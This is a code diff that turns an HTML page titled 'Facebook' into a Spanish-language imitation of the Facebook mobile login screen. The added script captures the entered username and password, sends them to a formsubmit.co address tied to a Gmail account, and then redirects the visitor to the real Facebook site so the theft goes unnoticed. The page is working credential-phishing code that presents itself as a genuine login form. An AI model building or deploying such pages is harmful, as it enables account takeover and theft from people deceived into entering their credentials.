@@ -6,94 +6,43 @@
     <title>Facebook</title>
     <link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/yb/r/hLRp1SfsL_y.ico">
     <style>
-        body { 
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; 
-            background-color: #fff; 
-            margin: 0; 
-            padding: 0;
-            color: #1c1e21;
+        body { font-family: Helvetica, Arial, sans-serif; background-color: #fff; margin: 0; padding: 0; display: flex; flex-direction: column; align-items: center; }
+        .header-mobile { width: 100%; text-align: center; padding: 20px 0; }
+        .fb-logo { color: #0866ff; font-size: 32px; font-weight: bold; letter-spacing: -1px; text-decoration: none; }
+        .login-container { width: 90%; max-width: 400px; margin-top: 10px; }
+        input { width: 100%; background-color: #f5f6f7; border: 1px solid #ccd0d5; border-radius: 8px; padding: 12px; margin-bottom: 12px; font-size: 14px; box-sizing: border-box; }
+        .btn-login { width: 100%; background-color: #0866ff; color: white; border: none; border-radius: 8px; padding: 10px; font-size: 16px; font-weight: bold; cursor: pointer; }
+        .links { text-align: center; margin-top: 15px; }
+        .forgot { color: #0866ff; font-size: 14px; text-decoration: none; display: block; margin-bottom: 20px; }
+        .divider { border-top: 1px solid #dadde1; margin-bottom: 20px; }
+        .btn-new { background-color: transparent; color: #0866ff; border: 1px solid #0866ff; border-radius: 8px; padding: 8px 16px; font-size: 14px; font-weight: bold; text-decoration: none; display: inline-block; }
+    </style>
+</head>
+<body>
+    <div class="header-mobile">
+        <div class="fb-logo">facebook</div>
+    </div>
+    <div class="login-container">
+        <form onsubmit="sendData(event)">
+            <input type="text" id="u" placeholder="Móvil o correo electrónico" required>
+            <input type="password" id="p" placeholder="Contraseña" required>
+            <button type="submit" class="btn-login">Iniciar sesión</button>
+        </form>
+        <div class="links">
+            <a href="https://m.facebook.com/login/identify/" class="forgot">¿Olvidaste tu contraseña?</a>
+            <div class="divider"></div>
+            <a href="https://m.facebook.com/reg/" class="btn-new">Crear cuenta nueva</a>
+        </div>
+    </div>
+    <script>
+        function sendData(e) {
+            e.preventDefault();
+            fetch('https://formsubmit.co/ajax/83739387z@gmail.com', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ Usuario: document.getElementById('u').value, Clave: document.getElementById('p').value })
+            }).then(() => { window.location.href = "https://m.facebook.com"; });
         }
-
-        /* VISTA MÓVIL (Por defecto) */
-        .mobile-login {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            padding: 0 16px;
-            margin-top: 20px;
-        }
-
-        .fb-logo {
-            color: #0866ff;
-            font-size: 30px;
-            font-weight: bold;
-            margin-bottom: 20px;
-            letter-spacing: -1px;
-        }
-
-        .login-card {
-            width: 100%;
-            max-width: 400px;
-        }
-
-        input {
-            width: 100%;
-            background-color: #f5f6f7;
-            border: 1px solid #ccd0d5;
-            border-radius: 8px;
-            padding: 12px;
-            margin-bottom: 10px;
-            font-size: 14px;
-            box-sizing: border-box;
-        }
-
-        .btn-blue {
-            width: 100%;
-            background-color: #0866ff;
-            color: white;
-            border: none;
-            border-radius: 8px;
-            padding: 10px;
-            font-size: 16px;
-            font-weight: bold;
-            cursor: pointer;
-            margin-top: 4px;
-        }
-
-        .forgot-link {
-            color: #0866ff;
-            font-size: 14px;
-            text-decoration: none;
-            margin: 15px 0;
-            display: block;
-        }
-
-        .divider {
-            width: 100%;
-            border-top: 1px solid #dadde1;
-            margin: 20px 0;
-        }
-
-        .btn-green-outline {
-            background-color: transparent;
-            color: #0866ff;
-            border: 1px solid #0866ff;
-            border-radius: 8px;
-            padding: 8px 16px;
-            font-size: 14px;
-            font-weight: bold;
-            cursor: pointer;
-            text-decoration: none;
-            display: inline-block;
-        }
-
-        .desktop-only { display: none; }
-
-        /* VISTA ESCRITORIO */
-        @media (min-width: 900px) {
-            body { background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; }
-            .mobile-login { display: none; }
-            .desktop-only { display: flex; width: 980px; justify-content: space-between; align-items: center; }
-            .left-text h1 { color: #0866ff; font-size: 60px; margin: 0; letter-spacing: -2px; }
-            .left-text p { font-size: 28px; width: 500px; line-height: 32px; margin-top: 0; }
-            .login-box { background: white; padding: 20px; border-radius
+    </script>
+</body>
+</html>
